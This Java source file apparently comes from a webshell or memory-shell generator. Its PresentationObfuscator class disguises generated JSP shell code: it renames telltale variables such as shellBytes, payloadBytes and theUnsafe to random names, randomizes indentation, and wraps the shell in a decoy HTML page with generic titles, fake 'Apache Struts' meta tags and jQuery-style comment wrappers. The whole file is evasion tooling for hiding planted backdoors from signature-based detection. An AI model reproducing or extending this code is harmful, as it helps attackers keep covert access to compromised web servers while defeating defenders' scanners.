package org.leo.jmg.mem.packer.obfuscation;

import org.leo.core.util.request.ClassNameGenerator;
import org.leo.core.util.request.GenerationRandom;
import org.leo.jmg.mem.packer.jsp.JspDocument;

import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.regex.Pattern;

/**
 * 负责标识符、空白格式和外层 HTML 展示变换。
 */
public final class PresentationObfuscator {

    private static final String[] HTML_TITLES = {
        "index", "default", "login", "home", "view",
        "main", "portal", "dashboard", "welcome", "page"
    };

    private static final String[] META_SNIPPETS = {
        "<meta charset=\"UTF-8\">",
        "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">",
        "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">",
        "<meta name=\"robots\" content=\"noindex,nofollow\">",
        "<meta name=\"generator\" content=\"Apache Struts\">"
    };

    private static final String[][] JAVASCRIPT_WRAPPERS = {
        {"$(document).ready(function(){/*", "*/});"},
        {"jQuery(document).ready(function(){/*", "*/});"},
        {"$(function(){/*", "*/});"},
        {"(function(w,d){/*", "*/})(window,document);"},
        {"window.onload=function(){/*", "*/};"},
        {"document.addEventListener('DOMContentLoaded',function(){/*", "*/});"}
    };

    private static final String[] KNOWN_SHELL_VARIABLES = {
        "shellBytes", "classBytes", "payloadBytes", "byteCode",
        "classLoader", "parentLoader", "targetLoader",
        "theUnsafe", "unsafe", "clazz", "cls"
    };

    private PresentationObfuscator() {
    }

    public static String wrapWithHtml(String jspCode) {
        Random random = GenerationRandom.current();
        String title = HTML_TITLES[random.nextInt(HTML_TITLES.length)];
        int metaCount = 1 + random.nextInt(2);
        StringBuilder head = new StringBuilder();
        Set<Integer> used = new HashSet<Integer>();
        for (int index = 0; index < metaCount; index++) {
            int selected;
            do {
                selected = random.nextInt(META_SNIPPETS.length);
            } while (!used.add(selected));
            head.append(META_SNIPPETS[selected]).append('\n');
        }
        String[] wrapper =
                JAVASCRIPT_WRAPPERS[random.nextInt(JAVASCRIPT_WRAPPERS.length)];
        String header = "<!DOCTYPE html>\n<html>\n<head>\n<title>" + title
                + "</title>\n" + head + "</head>\n<body></body>\n</html>\n"
                + "<script>\n" + wrapper[0] + "\n";
        return header + jspCode + "\n" + wrapper[1] + "\n</script>";
    }

    public static String renameIdentifiers(String code) {
        Set<String> used = new HashSet<String>();
        Map<String, String> mapping = new LinkedHashMap<String, String>();
        for (String variable : KNOWN_SHELL_VARIABLES) {
            if (Pattern.compile("\\b" + Pattern.quote(variable) + "\\b")
                    .matcher(code).find()) {
                mapping.put(variable, ClassNameGenerator.randomFieldName(used));
            }
        }
        if (mapping.isEmpty()) {
            return code;
        }
        final Map<String, String> replacements = mapping;
        return JspDocument.parse(code).transformJavaSegments(
                new JspDocument.ContentTransformer() {
                    @Override
                    public String transform(String content) {
                        return applyIdentifierMapping(content, replacements);
                    }
                }).render();
    }

    public static String normalizeWhitespace(String code) {
        final Random random = GenerationRandom.current();
        String[] options = {"  ", "   ", "    ", "\t"};
        final String indent = options[random.nextInt(options.length)];
        return JspDocument.parse(code).transformJavaSegments(
                new JspDocument.ContentTransformer() {
                    @Override
                    public String transform(String content) {
                        return reformat(content, indent, random);
                    }
                }).render();
    }

    private static String applyIdentifierMapping(
            String content, Map<String, String> mapping) {
        StringBuilder result = new StringBuilder(content.length());
        final int normal = 0;
        final int string = 1;
        final int character = 2;
        final int lineComment = 3;
        final int blockComment = 4;
        int state = normal;

        for (int index = 0; index < content.length();) {
            char current = content.charAt(index);
            char next = index + 1 < content.length()
                    ? content.charAt(index + 1) : '\0';
            if (state == normal) {
                if (current == '"') {
                    state = string;
                    result.append(current);
                    index++;
                } else if (current == '\'') {
                    state = character;
                    result.append(current);
                    index++;
                } else if (current == '/' && next == '/') {
                    state = lineComment;
                    result.append(current).append(next);
                    index += 2;
                } else if (current == '/' && next == '*') {
                    state = blockComment;
                    result.append(current).append(next);
                    index += 2;
                } else if (Character.isJavaIdentifierStart(current)) {
                    int end = index + 1;
                    while (end < content.length()
                            && Character.isJavaIdentifierPart(content.charAt(end))) {
                        end++;
                    }
                    String token = content.substring(index, end);
                    int lookahead = end;
                    while (lookahead < content.length()
                            && Character.isWhitespace(content.charAt(lookahead))) {
                        lookahead++;
                    }
                    String replacement = mapping.get(token);
                    boolean methodLike = lookahead < content.length()
                            && content.charAt(lookahead) == '(';
                    result.append(replacement != null && !methodLike
                            ? replacement : token);
                    index = end;
                } else {
                    result.append(current);
                    index++;
                }
                continue;
            }

            result.append(current);
            index++;
            if ((state == string || state == character)
                    && current == '\\' && index < content.length()) {
                result.append(content.charAt(index++));
            } else if (state == string && current == '"') {
                state = normal;
            } else if (state == character && current == '\'') {
                state = normal;
            } else if (state == lineComment
                    && (current == '\n' || current == '\r')) {
                state = normal;
            } else if (state == blockComment && current == '*'
                    && index < content.length() && content.charAt(index) == '/') {
                result.append('/');
                index++;
                state = normal;
            }
        }
        return result.toString();
    }

    private static String reformat(String content, String indent, Random random) {
        String[] lines = content.split("\n", -1);
        StringBuilder result = new StringBuilder();
        for (int index = 0; index < lines.length; index++) {
            String line = lines[index];
            String trimmed = line.trim();
            if (trimmed.isEmpty()) {
                if (random.nextInt(3) != 0) {
                    result.append('\n');
                }
                continue;
            }

            int spaces = 0;
            for (int charIndex = 0; charIndex < line.length(); charIndex++) {
                char value = line.charAt(charIndex);
                if (value == ' ') {
                    spaces++;
                } else if (value == '\t') {
                    spaces += 4;
                } else {
                    break;
                }
            }
            int level = spaces / 4;
            if (index > 0 && !lines[index - 1].trim().isEmpty()
                    && random.nextInt(5) == 0) {
                result.append('\n');
            }
            for (int depth = 0; depth < level; depth++) {
                result.append(indent);
            }
            result.append(trimmed).append('\n');
        }
        return result.toString();
    }
}
